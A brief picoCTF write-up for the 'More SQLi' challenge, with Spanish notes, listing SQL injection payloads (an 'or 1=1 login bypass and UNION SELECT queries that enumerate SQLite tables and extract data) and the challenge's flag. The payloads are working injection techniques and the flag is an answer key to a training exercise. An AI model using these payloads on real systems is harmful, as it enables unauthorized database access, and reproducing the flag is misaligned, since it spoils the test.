# 2 - More SQLi

## Descripcion:
* Can you find the flag on this website. Additional details will be available after launching your challenge instance.

## Solucion:
* http://saturn.picoctf.net:59496/
* 'or 1=1
* 'or 1=1;
* chancho' union select sqlite_version(),2,3;
* chancho' union select 1,2,tbl_name FROM sqlite_master WHERE type='table' ;
* chancho' union select 1,sql,tbl_name FROM sqlite_master WHERE type='table' ;
* chancho' union select 1,2,flag from more_table; 
* picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_c8b7cc2a}

## Notas:
* entramos a la pagina mostramos la pagina mostrada
* ponemos el usuario y la contraseña
* verificamos que vercion es
* vemos las tablas que tiene en la ciudad
* vemos las tablas en general
* vemos la bandera
* nos da la bandera

## Referencias: